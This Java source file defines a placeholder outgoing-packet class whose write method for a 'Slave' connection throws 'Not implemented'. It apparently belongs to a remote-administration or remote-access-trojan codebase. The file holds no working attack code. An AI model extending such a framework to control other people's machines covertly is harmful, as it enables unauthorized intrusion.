package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet26PlaceHolder extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		throw new Exception("Not implemented");
	}

	@Override
	public byte getPacketId() {
		return -1;
	}

}
